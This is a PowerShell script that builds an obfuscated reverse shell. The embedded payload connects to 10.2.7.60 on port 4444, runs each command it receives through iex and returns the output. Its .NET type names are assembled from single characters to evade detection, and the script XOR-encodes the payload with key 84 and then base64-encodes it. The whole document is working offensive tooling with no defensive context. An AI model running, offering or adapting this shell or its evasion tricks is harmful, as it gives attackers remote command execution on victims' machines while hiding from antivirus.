$key = 84  # XOR key (byte from 0 to 255)
$payload = @'
$a = "10.2.7.60"
$b = 4444
$tcpClientType = [type]([string]::Join('', ('S','y','s','t','e','m','.','N','e','t','.','S','o','c','k','e','t','s','.','T','c','p','C','l','i','e','n','t')))
$streamWriterType = [type]([string]::Join('', ('S','y','s','t','e','m','.','I','O','.','S','t','r','e','a','m','W','r','i','t','e','r')))
$asciiEncodingType = [type]([string]::Join('', ('S','y','s','t','e','m','.','T','e','x','t','.','A','S','C','I','I','E','n','c','o','d','i','n','g')))
$textEncodingType = [type]([string]::Join('', ('S','y','s','t','e','m','.','T','e','x','t','.','E','n','c','o','d','i','n','g')))
$invokeExp = ([string]::Join('', ('i','e','x')))
$client = New-Object $tcpClientType $a, $b
$stream = $client.GetStream()
$writer = New-Object $streamWriterType $stream
$writer.AutoFlush = $true
$buffer = New-Object byte[] 1024
while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = (New-Object $asciiEncodingType).GetString($buffer, 0, $i)
    try {
        $sendback = (& $invokeExp $data 2>&1 | Out-String)
    }
    catch {
        $sendback = $_.Exception.Message
    }
    $sendback2 = "`n$sendback`nPWD: '" + (pwd).Path + "$#'"
    $sendBytes = $textEncodingType::ASCII.GetBytes($sendback2)
    $stream.Write($sendBytes, 0, $sendBytes.Length)
    $stream.Flush()
}
$client.Close()
'@

# Convert string to bytes (UTF8 encoding)
$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)

# XOR each byte with the key
$xorBytes = $bytes | ForEach-Object { $_ -bxor $key }

# Base64 encode the XORed bytes
$encoded = [Convert]::ToBase64String($xorBytes)

# Output the encoded string
$encoded
